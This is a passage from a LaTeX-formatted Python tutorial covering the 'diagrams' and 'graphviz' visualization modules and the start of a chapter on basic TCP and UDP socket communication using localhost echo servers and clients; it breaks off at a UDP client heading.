\subsection{Example 2: Complex Microservices
Architecture}\label{example-2-complex-microservices-architecture}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{from}\NormalTok{ diagrams }\ImportTok{import}\NormalTok{ Diagram, Cluster}
\ImportTok{from}\NormalTok{ diagrams.aws.compute }\ImportTok{import}\NormalTok{ EC2}
\ImportTok{from}\NormalTok{ diagrams.aws.database }\ImportTok{import}\NormalTok{ RDS}
\ImportTok{from}\NormalTok{ diagrams.aws.network }\ImportTok{import}\NormalTok{ ELB}
\ImportTok{from}\NormalTok{ diagrams.onprem.client }\ImportTok{import}\NormalTok{ User}

\ControlFlowTok{with}\NormalTok{ Diagram(}\StringTok{"Microservices Architecture"}\NormalTok{, show}\OperatorTok{=}\VariableTok{False}\NormalTok{):}
\NormalTok{    user }\OperatorTok{=}\NormalTok{ User(}\StringTok{"User"}\NormalTok{)}
    
    \ControlFlowTok{with}\NormalTok{ Cluster(}\StringTok{"Load Balancer"}\NormalTok{):}
\NormalTok{        lb }\OperatorTok{=}\NormalTok{ ELB(}\StringTok{"Load Balancer"}\NormalTok{)}
        
    \ControlFlowTok{with}\NormalTok{ Cluster(}\StringTok{"Services"}\NormalTok{):}
\NormalTok{        svc1 }\OperatorTok{=}\NormalTok{ EC2(}\StringTok{"Service 1"}\NormalTok{)}
\NormalTok{        svc2 }\OperatorTok{=}\NormalTok{ EC2(}\StringTok{"Service 2"}\NormalTok{)}
\NormalTok{        svc3 }\OperatorTok{=}\NormalTok{ EC2(}\StringTok{"Service 3"}\NormalTok{)}
    
\NormalTok{    db }\OperatorTok{=}\NormalTok{ RDS(}\StringTok{"Database"}\NormalTok{)}
    
\NormalTok{    user }\OperatorTok{\textgreater{}\textgreater{}}\NormalTok{ lb}
\NormalTok{    lb }\OperatorTok{\textgreater{}\textgreater{}}\NormalTok{ svc1}
\NormalTok{    lb }\OperatorTok{\textgreater{}\textgreater{}}\NormalTok{ svc2}
\NormalTok{    lb }\OperatorTok{\textgreater{}\textgreater{}}\NormalTok{ svc3}
\NormalTok{    svc1 }\OperatorTok{\textgreater{}\textgreater{}}\NormalTok{ db}
\NormalTok{    svc2 }\OperatorTok{\textgreater{}\textgreater{}}\NormalTok{ db}
\NormalTok{    svc3 }\OperatorTok{\textgreater{}\textgreater{}}\NormalTok{ db}
\end{Highlighting}
\end{Shaded}

\section{Best Practices}\label{best-practices-6}

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  \textbf{Organize Components}: Use clusters to logically group related
  components.
\item
  \textbf{Use Descriptive Names}: Label your nodes and clusters with
  meaningful names.
\item
  \textbf{Optimize Layout}: Adjust the diagram direction and other
  settings to make the diagram clear and easy to understand.
\item
  \textbf{Document Your Diagram}: Provide context and explanations for
  your diagram to help others understand it.
\end{enumerate}

\section{Conclusion}\label{conclusion-39}

The \texttt{diagrams} module in Python is a powerful tool for creating
detailed and professional-looking diagrams for cloud architecture,
network layouts, and other system configurations. With its simple and
intuitive syntax, you can quickly create and customize diagrams to suit
your needs. By leveraging the full range of features provided by
\texttt{diagrams}, you can improve the clarity and effectiveness of your
documentation and presentations.

\bookmarksetup{startatroot}

\chapter{\texorpdfstring{Deep Dive into the \texttt{graphviz} Python
Module}{Deep Dive into the graphviz Python Module}}\label{deep-dive-into-the-graphviz-python-module}

The \texttt{graphviz} Python module is an interface for creating and
rendering Graphviz graphs. Graphviz is an open-source graph
visualization software that allows you to create diagrams and visual
representations of graphs using the DOT language. This tutorial will
cover the installation, basic usage, and advanced features of the
\texttt{graphviz} module.

\section{Table of Contents}\label{table-of-contents-15}

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  \hyperref[introduction-to-graphviz]{Introduction to Graphviz}
\item
  \hyperref[installation]{Installation}
\item
  \hyperref[basic-usage]{Basic Usage}
\item
  \hyperref[creating-graphs]{Creating Graphs}
\item
  \hyperref[customizing-graphs]{Customizing Graphs}
\item
  \hyperref[working-with-subgraphs]{Working with Subgraphs}
\item
  \hyperref[advanced-features]{Advanced Features}
\item
  \hyperref[practical-examples]{Practical Examples}
\item
  \hyperref[exporting-and-rendering]{Exporting and Rendering}
\item
  \hyperref[best-practices]{Best Practices}
\item
  \hyperref[conclusion]{Conclusion}
\end{enumerate}

\section{Introduction to Graphviz}\label{introduction-to-graphviz}

Graphviz is a graph visualization software that provides a way to
represent structural information as diagrams of abstract graphs and
networks. The \texttt{graphviz} Python module provides a way to
interface with the Graphviz software, allowing you to create and
manipulate graphs directly from Python code.

\section{Installation}\label{installation-2}

To install the \texttt{graphviz} module, you need to have Python
installed on your system. You can then install it using \texttt{pip}:

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{pip}\NormalTok{ install graphviz}
\end{Highlighting}
\end{Shaded}

Additionally, you need to have the Graphviz software installed.
Depending on your operating system, you can install it using the
following commands:

\begin{itemize}
\item
  \textbf{For Ubuntu/Debian:}

\begin{Shaded}
\begin{Highlighting}[]
\FunctionTok{sudo}\NormalTok{ apt{-}get install graphviz}
\end{Highlighting}
\end{Shaded}
\item
  \textbf{For macOS:}

\begin{Shaded}
\begin{Highlighting}[]
\ExtensionTok{brew}\NormalTok{ install graphviz}
\end{Highlighting}
\end{Shaded}
\item
  \textbf{For Windows:}

  Download and install Graphviz from
  \href{https://graphviz.gitlab.io/download/}{here}.
\end{itemize}

\section{Basic Usage}\label{basic-usage-5}

To create a basic graph using the \texttt{graphviz} module, you need to
import the \texttt{Graph} or \texttt{Digraph} class from the
\texttt{graphviz} module. A \texttt{Graph} is an undirected graph, while
a \texttt{Digraph} is a directed graph.

\subsection{Example}\label{example-40}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{from}\NormalTok{ graphviz }\ImportTok{import}\NormalTok{ Digraph}

\NormalTok{dot }\OperatorTok{=}\NormalTok{ Digraph(comment}\OperatorTok{=}\StringTok{\textquotesingle{}My First Graph\textquotesingle{}}\NormalTok{)}
\NormalTok{dot.node(}\StringTok{\textquotesingle{}A\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}Node A\textquotesingle{}}\NormalTok{)}
\NormalTok{dot.node(}\StringTok{\textquotesingle{}B\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}Node B\textquotesingle{}}\NormalTok{)}
\NormalTok{dot.edge(}\StringTok{\textquotesingle{}A\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}B\textquotesingle{}}\NormalTok{, label}\OperatorTok{=}\StringTok{\textquotesingle{}Edge from A to B\textquotesingle{}}\NormalTok{)}
\BuiltInTok{print}\NormalTok{(dot.source)}

\NormalTok{dot.render(}\StringTok{\textquotesingle{}output/first\_graph\textquotesingle{}}\NormalTok{, }\BuiltInTok{format}\OperatorTok{=}\StringTok{\textquotesingle{}png\textquotesingle{}}\NormalTok{, view}\OperatorTok{=}\VariableTok{True}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

This code snippet creates a simple directed graph with two nodes and an
edge between them. The \texttt{render} method saves the graph to a file
and optionally opens it for viewing.

\section{Creating Graphs}\label{creating-graphs}

\subsection{Nodes}\label{nodes}

Nodes represent the vertices of the graph. You can add nodes to the
graph using the \texttt{node} method.

\subsection{Example}\label{example-41}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{dot.node(}\StringTok{\textquotesingle{}A\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}Node A\textquotesingle{}}\NormalTok{)}
\NormalTok{dot.node(}\StringTok{\textquotesingle{}B\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}Node B\textquotesingle{}}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\subsection{Edges}\label{edges}

Edges represent the connections between nodes. You can add edges to the
graph using the \texttt{edge} method.

\subsection{Example}\label{example-42}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{dot.edge(}\StringTok{\textquotesingle{}A\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}B\textquotesingle{}}\NormalTok{, label}\OperatorTok{=}\StringTok{\textquotesingle{}Edge from A to B\textquotesingle{}}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\subsection{Adding Multiple Edges}\label{adding-multiple-edges}

You can add multiple edges at once using the \texttt{edges} method.

\subsection{Example}\label{example-43}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{dot.edges([}\StringTok{\textquotesingle{}AC\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}BD\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}CD\textquotesingle{}}\NormalTok{])}
\end{Highlighting}
\end{Shaded}

\section{Customizing Graphs}\label{customizing-graphs-1}

\subsection{Node Attributes}\label{node-attributes}

You can customize the appearance of nodes using various attributes such
as \texttt{color}, \texttt{shape}, and \texttt{style}.

\subsection{Example}\label{example-44}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{dot.node(}\StringTok{\textquotesingle{}A\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}Node A\textquotesingle{}}\NormalTok{, color}\OperatorTok{=}\StringTok{\textquotesingle{}lightblue\textquotesingle{}}\NormalTok{, style}\OperatorTok{=}\StringTok{\textquotesingle{}filled\textquotesingle{}}\NormalTok{, shape}\OperatorTok{=}\StringTok{\textquotesingle{}box\textquotesingle{}}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\subsection{Edge Attributes}\label{edge-attributes}

You can customize the appearance of edges using attributes such as
\texttt{color}, \texttt{style}, and \texttt{label}.

\subsection{Example}\label{example-45}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{dot.edge(}\StringTok{\textquotesingle{}A\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}B\textquotesingle{}}\NormalTok{, label}\OperatorTok{=}\StringTok{\textquotesingle{}Edge from A to B\textquotesingle{}}\NormalTok{, color}\OperatorTok{=}\StringTok{\textquotesingle{}red\textquotesingle{}}\NormalTok{, style}\OperatorTok{=}\StringTok{\textquotesingle{}dashed\textquotesingle{}}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\subsection{Graph Attributes}\label{graph-attributes}

You can set global attributes for the graph, nodes, and edges using the
\texttt{attr} method.

\subsection{Example}\label{example-46}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{dot.attr(rankdir}\OperatorTok{=}\StringTok{\textquotesingle{}LR\textquotesingle{}}\NormalTok{, size}\OperatorTok{=}\StringTok{\textquotesingle{}8,5\textquotesingle{}}\NormalTok{)}
\NormalTok{dot.node\_attr.update(style}\OperatorTok{=}\StringTok{\textquotesingle{}filled\textquotesingle{}}\NormalTok{, color}\OperatorTok{=}\StringTok{\textquotesingle{}lightgrey\textquotesingle{}}\NormalTok{)}
\NormalTok{dot.edge\_attr.update(arrowsize}\OperatorTok{=}\StringTok{\textquotesingle{}2\textquotesingle{}}\NormalTok{, color}\OperatorTok{=}\StringTok{\textquotesingle{}blue\textquotesingle{}}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\section{Working with Subgraphs}\label{working-with-subgraphs}

Subgraphs allow you to group nodes and edges into clusters or logical
groups.

\subsection{Example}\label{example-47}

\begin{Shaded}
\begin{Highlighting}[]
\ControlFlowTok{with}\NormalTok{ dot.subgraph(name}\OperatorTok{=}\StringTok{\textquotesingle{}cluster\_0\textquotesingle{}}\NormalTok{) }\ImportTok{as}\NormalTok{ c:}
\NormalTok{    c.attr(style}\OperatorTok{=}\StringTok{\textquotesingle{}filled\textquotesingle{}}\NormalTok{, color}\OperatorTok{=}\StringTok{\textquotesingle{}lightgrey\textquotesingle{}}\NormalTok{)}
\NormalTok{    c.node\_attr.update(style}\OperatorTok{=}\StringTok{\textquotesingle{}filled\textquotesingle{}}\NormalTok{, color}\OperatorTok{=}\StringTok{\textquotesingle{}white\textquotesingle{}}\NormalTok{)}
\NormalTok{    c.node(}\StringTok{\textquotesingle{}A\textquotesingle{}}\NormalTok{)}
\NormalTok{    c.node(}\StringTok{\textquotesingle{}B\textquotesingle{}}\NormalTok{)}
\NormalTok{    c.edge(}\StringTok{\textquotesingle{}A\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}B\textquotesingle{}}\NormalTok{, label}\OperatorTok{=}\StringTok{\textquotesingle{}Edge in Cluster\textquotesingle{}}\NormalTok{)}
\NormalTok{    c.attr(label}\OperatorTok{=}\StringTok{\textquotesingle{}Cluster 0\textquotesingle{}}\NormalTok{)}

\NormalTok{dot.node(}\StringTok{\textquotesingle{}C\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}Node C\textquotesingle{}}\NormalTok{)}
\NormalTok{dot.edge(}\StringTok{\textquotesingle{}B\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}C\textquotesingle{}}\NormalTok{, label}\OperatorTok{=}\StringTok{\textquotesingle{}Edge to C\textquotesingle{}}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\section{Advanced Features}\label{advanced-features-1}

\subsection{Record-Based Nodes}\label{record-based-nodes}

Record-based nodes allow you to create nodes with multiple fields, which
is useful for representing structured data.

\subsection{Example}\label{example-48}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{dot.node(}\StringTok{\textquotesingle{}struct1\textquotesingle{}}\NormalTok{, label}\OperatorTok{=}\StringTok{\textquotesingle{}\textless{}f0\textgreater{} left|\textless{}f1\textgreater{} mid\textbackslash{} dle|\textless{}f2\textgreater{} right\textquotesingle{}}\NormalTok{, shape}\OperatorTok{=}\StringTok{\textquotesingle{}record\textquotesingle{}}\NormalTok{)}
\NormalTok{dot.node(}\StringTok{\textquotesingle{}struct2\textquotesingle{}}\NormalTok{, label}\OperatorTok{=}\StringTok{\textquotesingle{}one|two\textquotesingle{}}\NormalTok{, shape}\OperatorTok{=}\StringTok{\textquotesingle{}record\textquotesingle{}}\NormalTok{)}
\NormalTok{dot.edge(}\StringTok{\textquotesingle{}struct1:f1\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}struct2\textquotesingle{}}\NormalTok{, label}\OperatorTok{=}\StringTok{\textquotesingle{}Field Link\textquotesingle{}}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\subsection{HTML-Like Labels}\label{html-like-labels}

You can use HTML-like labels to create more complex node labels.

\subsection{Example}\label{example-49}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{dot.node(}\StringTok{\textquotesingle{}html\_node\textquotesingle{}}\NormalTok{, label}\OperatorTok{=}\StringTok{\textquotesingle{}\textless{}\textless{}TABLE BORDER="0" CELLBORDER="1" CELLSPACING="0"\textgreater{}\textless{}TR\textgreater{}\textless{}TD\textgreater{}Cell 1\textless{}/TD\textgreater{}\textless{}TD\textgreater{}Cell 2\textless{}/TD\textgreater{}\textless{}/TR\textgreater{}\textless{}/TABLE\textgreater{}\textgreater{}\textquotesingle{}}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\subsection{Changing Ranks}\label{changing-ranks}

You can change the rank of nodes to control their layout in the graph.

\subsection{Example}\label{example-50}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{dot.attr(rankdir}\OperatorTok{=}\StringTok{\textquotesingle{}LR\textquotesingle{}}\NormalTok{)}
\NormalTok{dot.node(}\StringTok{\textquotesingle{}A\textquotesingle{}}\NormalTok{)}
\NormalTok{dot.node(}\StringTok{\textquotesingle{}B\textquotesingle{}}\NormalTok{)}
\NormalTok{dot.edge(}\StringTok{\textquotesingle{}A\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}B\textquotesingle{}}\NormalTok{)}

\ControlFlowTok{with}\NormalTok{ dot.subgraph() }\ImportTok{as}\NormalTok{ s:}
\NormalTok{    s.attr(rank}\OperatorTok{=}\StringTok{\textquotesingle{}same\textquotesingle{}}\NormalTok{)}
\NormalTok{    s.node(}\StringTok{\textquotesingle{}C\textquotesingle{}}\NormalTok{)}
\NormalTok{    s.node(}\StringTok{\textquotesingle{}D\textquotesingle{}}\NormalTok{)}

\NormalTok{dot.edge(}\StringTok{\textquotesingle{}B\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}C\textquotesingle{}}\NormalTok{)}
\NormalTok{dot.edge(}\StringTok{\textquotesingle{}C\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}D\textquotesingle{}}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\section{Practical Examples}\label{practical-examples-8}

\subsection{Example 1: Organizational
Chart}\label{example-1-organizational-chart}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{from}\NormalTok{ graphviz }\ImportTok{import}\NormalTok{ Digraph}

\NormalTok{org\_chart }\OperatorTok{=}\NormalTok{ Digraph(comment}\OperatorTok{=}\StringTok{\textquotesingle{}Organizational Chart\textquotesingle{}}\NormalTok{)}

\NormalTok{org\_chart.node(}\StringTok{\textquotesingle{}CEO\textquotesingle{}}\NormalTok{)}
\NormalTok{org\_chart.node(}\StringTok{\textquotesingle{}CTO\textquotesingle{}}\NormalTok{)}
\NormalTok{org\_chart.node(}\StringTok{\textquotesingle{}CFO\textquotesingle{}}\NormalTok{)}
\NormalTok{org\_chart.node(}\StringTok{\textquotesingle{}COO\textquotesingle{}}\NormalTok{)}
\NormalTok{org\_chart.node(}\StringTok{\textquotesingle{}Dev1\textquotesingle{}}\NormalTok{)}
\NormalTok{org\_chart.node(}\StringTok{\textquotesingle{}Dev2\textquotesingle{}}\NormalTok{)}
\NormalTok{org\_chart.node(}\StringTok{\textquotesingle{}Account1\textquotesingle{}}\NormalTok{)}
\NormalTok{org\_chart.node(}\StringTok{\textquotesingle{}Account2\textquotesingle{}}\NormalTok{)}

\NormalTok{org\_chart.edges([}\StringTok{\textquotesingle{}CEOCTO\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}CEOCFO\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}CEOCMO\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}CTODev1\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}CTODev2\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}CFOAccount1\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}CFOAccount2\textquotesingle{}}\NormalTok{])}

\NormalTok{org\_chart.render(}\StringTok{\textquotesingle{}output/org\_chart\textquotesingle{}}\NormalTok{, }\BuiltInTok{format}\OperatorTok{=}\StringTok{\textquotesingle{}png\textquotesingle{}}\NormalTok{, view}\OperatorTok{=}\VariableTok{True}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\subsection{Example 2: Network
Topology}\label{example-2-network-topology}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{from}\NormalTok{ graphviz }\ImportTok{import}\NormalTok{ Digraph}

\NormalTok{net\_topo }\OperatorTok{=}\NormalTok{ Digraph(comment}\OperatorTok{=}\StringTok{\textquotesingle{}Network Topology\textquotesingle{}}\NormalTok{)}

\NormalTok{net\_topo.node(}\StringTok{\textquotesingle{}Router\textquotesingle{}}\NormalTok{, shape}\OperatorTok{=}\StringTok{\textquotesingle{}box\textquotesingle{}}\NormalTok{)}
\NormalTok{net\_topo.node(}\StringTok{\textquotesingle{}Switch\textquotesingle{}}\NormalTok{, shape}\OperatorTok{=}\StringTok{\textquotesingle{}box\textquotesingle{}}\NormalTok{)}
\NormalTok{net\_topo.node(}\StringTok{\textquotesingle{}Server1\textquotesingle{}}\NormalTok{, shape}\OperatorTok{=}\StringTok{\textquotesingle{}oval\textquotesingle{}}\NormalTok{)}
\NormalTok{net\_topo.node(}\StringTok{\textquotesingle{}Server2\textquotesingle{}}\NormalTok{, shape}\OperatorTok{=}\StringTok{\textquotesingle{}oval\textquotesingle{}}\NormalTok{)}
\NormalTok{net\_topo.node(}\StringTok{\textquotesingle{}PC1\textquotesingle{}}\NormalTok{, shape}\OperatorTok{=}\StringTok{\textquotesingle{}oval\textquotesingle{}}\NormalTok{)}
\NormalTok{net\_topo.node(}\StringTok{\textquotesingle{}PC2\textquotesingle{}}\NormalTok{, shape}\OperatorTok{=}\StringTok{\textquotesingle{}oval\textquotesingle{}}\NormalTok{)}

\NormalTok{net\_topo.edges([}\StringTok{\textquotesingle{}RouterSwitch\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}SwitchServer1\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}SwitchServer2\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}SwitchPC1\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}SwitchPC2\textquotesingle{}}\NormalTok{])}

\NormalTok{net\_topo.render(}\StringTok{\textquotesingle{}output/net\_topo\textquotesingle{}}\NormalTok{, }\BuiltInTok{format}\OperatorTok{=}\StringTok{\textquotesingle{}png\textquotesingle{}}\NormalTok{, view}\OperatorTok{=}\VariableTok{True}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\section{Exporting and Rendering}\label{exporting-and-rendering}

You can export and render your graph to various formats, including PNG,
PDF, and SVG.

\subsection{Example}\label{example-51}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{dot.render(}\StringTok{\textquotesingle{}output/my\_graph\textquotesingle{}}\NormalTok{, }\BuiltInTok{format}\OperatorTok{=}\StringTok{\textquotesingle{}png\textquotesingle{}}\NormalTok{, view}\OperatorTok{=}\VariableTok{True}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

This command saves the graph as a PNG file and opens it for viewing.

\section{Best Practices}\label{best-practices-7}

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  \textbf{Use Meaningful Labels}: Label your nodes and edges with
  meaningful names to make the graph easier to understand.
\item
  \textbf{Organize with Subgraphs}: Use subgraphs to logically group
  related nodes and edges.
\item
  \textbf{Customize for Clarity}: Customize the appearance of nodes and
  edges to improve readability.
\item
  \textbf{Keep it Simple}: Avoid overly complex graphs that are hard to
  read and understand.
\item
  \textbf{Document Your Graph}: Provide context and explanations for
  your graph to help others understand it.
\end{enumerate}

\section{Conclusion}\label{conclusion-40}

The \texttt{graphviz} Python module is a powerful tool for creating and
visualizing graphs. It provides a simple and intuitive interface for
creating complex diagrams and supports various customization options to
improve the clarity and readability of your graphs. By leveraging the
full range of features provided by \texttt{graphviz}, you can create
detailed and professional-looking diagrams for a wide range of
applications.

\bookmarksetup{startatroot}

\chapter{Foundations of Data Communication with
Python}\label{foundations-of-data-communication-with-python}

Data communication is the process of transmitting data between devices
and systems. Understanding the basics of data communication, network
architectures, and communication protocols is essential for designing
and managing efficient networks. This tutorial will provide an overview
of data communication and demonstrate how to use the \texttt{socket}
library in Python for basic network communication.

\subsection{Overview of Data
Communication}\label{overview-of-data-communication}

Data communication involves the exchange of data between devices through
a transmission medium. Key components include:

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  \textbf{Sender}: The device that sends the data.
\item
  \textbf{Receiver}: The device that receives the data.
\item
  \textbf{Transmission Medium}: The physical path through which the data
  is transmitted (e.g., cables, wireless signals).
\item
  \textbf{Protocol}: A set of rules governing data communication.
\end{enumerate}

\subsection{Network Architectures}\label{network-architectures}

Network architectures define the layout and structure of a network.
Common architectures include:

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  \textbf{Peer-to-Peer (P2P)}: Each device (peer) has equal status and
  can act as both a client and a server.
\item
  \textbf{Client-Server}: A central server provides services to multiple
  clients. Clients request services, and the server responds.
\end{enumerate}

\subsection{Communication Protocols}\label{communication-protocols}

Communication protocols are sets of rules that determine how data is
transmitted and received over a network. Key protocols include:

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  \textbf{TCP/IP (Transmission Control Protocol/Internet Protocol)}:
  Ensures reliable data transmission over the internet.
\item
  \textbf{UDP (User Datagram Protocol)}: A simpler, connectionless
  protocol for faster, less reliable communication.
\item
  \textbf{HTTP (Hypertext Transfer Protocol)}: Used for transferring web
  pages.
\item
  \textbf{FTP (File Transfer Protocol)}: Used for transferring files.
\end{enumerate}

\subsection{\texorpdfstring{Basic Network Communication with
\texttt{socket}}{Basic Network Communication with socket}}\label{basic-network-communication-with-socket}

Python's \texttt{socket} library allows you to perform network
communication. It provides a low-level interface for sending and
receiving data over the network.

\subsubsection{\texorpdfstring{Installing
\texttt{socket}}{Installing socket}}\label{installing-socket}

The \texttt{socket} library is part of Python's standard library, so no
installation is needed.

\subsubsection{Creating a Simple TCP
Server}\label{creating-a-simple-tcp-server}

A TCP server listens for incoming connections from clients and processes
their requests.

\paragraph{Example: TCP Server}\label{example-tcp-server}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ socket}

\CommentTok{\# Define the host and port}
\NormalTok{HOST }\OperatorTok{=} \StringTok{\textquotesingle{}127.0.0.1\textquotesingle{}}  \CommentTok{\# Localhost}
\NormalTok{PORT }\OperatorTok{=} \DecValTok{65432}        \CommentTok{\# Arbitrary non{-}privileged port}

\CommentTok{\# Create a TCP socket}
\ControlFlowTok{with}\NormalTok{ socket.socket(socket.AF\_INET, socket.SOCK\_STREAM) }\ImportTok{as}\NormalTok{ server\_socket:}
\NormalTok{    server\_socket.bind((HOST, PORT))}
\NormalTok{    server\_socket.listen()}
    \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Server listening on }\SpecialCharTok{\{}\NormalTok{HOST}\SpecialCharTok{\}}\SpecialStringTok{:}\SpecialCharTok{\{}\NormalTok{PORT}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}

    \CommentTok{\# Accept a connection}
\NormalTok{    conn, addr }\OperatorTok{=}\NormalTok{ server\_socket.accept()}
    \ControlFlowTok{with}\NormalTok{ conn:}
        \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Connected by }\SpecialCharTok{\{}\NormalTok{addr}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}
        \ControlFlowTok{while} \VariableTok{True}\NormalTok{:}
\NormalTok{            data }\OperatorTok{=}\NormalTok{ conn.recv(}\DecValTok{1024}\NormalTok{)}
            \ControlFlowTok{if} \KeywordTok{not}\NormalTok{ data:}
                \ControlFlowTok{break}
            \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Received: }\SpecialCharTok{\{}\NormalTok{data}\SpecialCharTok{.}\NormalTok{decode()}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}
\NormalTok{            conn.sendall(data)  }\CommentTok{\# Echo the received data back to the client}
\end{Highlighting}
\end{Shaded}

\subsubsection{Creating a Simple TCP
Client}\label{creating-a-simple-tcp-client}

A TCP client connects to a server, sends data, and receives a response.

\paragraph{Example: TCP Client}\label{example-tcp-client}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ socket}

\CommentTok{\# Define the host and port}
\NormalTok{HOST }\OperatorTok{=} \StringTok{\textquotesingle{}127.0.0.1\textquotesingle{}}  \CommentTok{\# The server\textquotesingle{}s hostname or IP address}
\NormalTok{PORT }\OperatorTok{=} \DecValTok{65432}        \CommentTok{\# The port used by the server}

\CommentTok{\# Create a TCP socket}
\ControlFlowTok{with}\NormalTok{ socket.socket(socket.AF\_INET, socket.SOCK\_STREAM) }\ImportTok{as}\NormalTok{ client\_socket:}
\NormalTok{    client\_socket.}\ExtensionTok{connect}\NormalTok{((HOST, PORT))}
\NormalTok{    client\_socket.sendall(}\StringTok{b\textquotesingle{}Hello, World!\textquotesingle{}}\NormalTok{)}
\NormalTok{    data }\OperatorTok{=}\NormalTok{ client\_socket.recv(}\DecValTok{1024}\NormalTok{)}

\BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Received: }\SpecialCharTok{\{}\NormalTok{data}\SpecialCharTok{.}\NormalTok{decode()}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\subsection{Creating a Simple UDP
Server}\label{creating-a-simple-udp-server}

A UDP server listens for incoming datagrams (packets) from clients and
processes them.

\paragraph{Example: UDP Server}\label{example-udp-server}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ socket}

\CommentTok{\# Define the host and port}
\NormalTok{HOST }\OperatorTok{=} \StringTok{\textquotesingle{}127.0.0.1\textquotesingle{}}  \CommentTok{\# Localhost}
\NormalTok{PORT }\OperatorTok{=} \DecValTok{65432}        \CommentTok{\# Arbitrary non{-}privileged port}

\CommentTok{\# Create a UDP socket}
\ControlFlowTok{with}\NormalTok{ socket.socket(socket.AF\_INET, socket.SOCK\_DGRAM) }\ImportTok{as}\NormalTok{ server\_socket:}
\NormalTok{    server\_socket.bind((HOST, PORT))}
    \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"UDP server listening on }\SpecialCharTok{\{}\NormalTok{HOST}\SpecialCharTok{\}}\SpecialStringTok{:}\SpecialCharTok{\{}\NormalTok{PORT}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}

    \ControlFlowTok{while} \VariableTok{True}\NormalTok{:}
\NormalTok{        data, addr }\OperatorTok{=}\NormalTok{ server\_socket.recvfrom(}\DecValTok{1024}\NormalTok{)}
        \BuiltInTok{print}\NormalTok{(}\SpecialStringTok{f"Received: }\SpecialCharTok{\{}\NormalTok{data}\SpecialCharTok{.}\NormalTok{decode()}\SpecialCharTok{\}}\SpecialStringTok{ from }\SpecialCharTok{\{}\NormalTok{addr}\SpecialCharTok{\}}\SpecialStringTok{"}\NormalTok{)}
\NormalTok{        server\_socket.sendto(data, addr)  }\CommentTok{\# Echo the received data back to the client}
\end{Highlighting}
\end{Shaded}

\subsection{Creating a Simple UDP
Client}\label{creating-a-simple-udp-client}

A UDP client sends datagrams to a server and receives responses.

\paragraph{Example: UDP Client}\label{example-udp-client}

